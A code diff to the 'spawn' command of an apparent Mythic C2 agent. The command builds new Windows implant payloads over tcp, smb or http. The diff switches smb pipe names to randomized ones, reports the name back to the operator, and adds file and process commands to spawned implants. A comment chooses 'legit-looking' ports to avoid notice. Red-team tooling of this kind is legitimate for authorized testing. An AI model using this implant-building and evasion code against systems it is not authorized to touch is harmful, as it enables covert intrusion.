@@ -1,7 +1,7 @@
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 
-import asyncio, json, random, string
+import asyncio, json, random
 
 class SpawnArguments(TaskArguments):
 
@@ -84,14 +84,14 @@ class SpawnCommand(CommandBase):
 				raise Exception("No host given and this agent has no http profile to inherit one from")
 
 		# Generate unique p2p bind parameters when not supplied, so several
-		# spawned children on the same host don't collide.
+		# spawned children on the same host don't collide. For smb, leaving the
+		# pipename out lets the c2 profile's randomize=True generate the
+		# canonical per-build UUID-style name; we read it back after the build.
 		port = taskData.args.get_arg("port")
 		pipename = taskData.args.get_arg("pipename")
 		if profile == "tcp" and not port:
 			# High, legit-looking ephemeral range (avoids low/common ports).
 			port = random.randint(45621, 59832)
-		if profile == "smb" and not pipename:
-			pipename = "celebi" + "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
 
 		if profile == "http":
 			cb_host = host if "://" in host else "http://" + host
@@ -107,8 +107,10 @@ class SpawnCommand(CommandBase):
 			params = {"port": str(port), "localhost_only": False, "killdate": "",
 			          "encrypted_exchange_check": True, "AESPSK": "aes256_hmac"}
 		else:
-			params = {"pipename": pipename, "killdate": "",
+			params = {"killdate": "",
 			          "encrypted_exchange_check": True, "AESPSK": "aes256_hmac"}
+			if pipename:
+				params["pipename"] = pipename
 
 		config = MythicRPCPayloadConfiguration(
 			description="{} spawned from task {}".format(taskData.Task.OperatorUsername, taskData.Task.DisplayID),
@@ -117,7 +119,7 @@ class SpawnCommand(CommandBase):
 			build_parameters=[{"name": "debug", "value": False},
 			                  {"name": "exit_func", "value": "process"}],
 			commands=["exit", "whoami", "sleep", "register", "unregister", "execute_pico", "morph",
-			          "link", "unlink", "spawn", "spawnto"],
+			          "link", "unlink", "spawn", "spawnto", "ls", "ps", "cat", "pwd", "change", "cd"],
 			selected_os="Windows",
 			filename="spawn-{}.bin".format(profile),
 		)
@@ -153,6 +155,14 @@ class SpawnCommand(CommandBase):
 		if profile == "tcp":
 			extra = ", port {}".format(port)
 		elif profile == "smb":
+			# If the operator didn't supply a pipename, the c2 profile's
+			# randomize=True generated one at build time — read it back so the
+			# operator knows what to link to.
+			if not pipename:
+				for c2 in (search.Payloads[0].C2Profiles if search.Payloads else []):
+					if getattr(c2, "Name", None) == "smb" and getattr(c2, "Parameters", None):
+						pipename = c2.Parameters.get("pipename") or pipename
+						break
 			extra = ", pipename {}".format(pipename)
 		response.DisplayParams = "Built {} payload (file {}{})".format(profile, agent_file_id[:8], extra)
 		return response
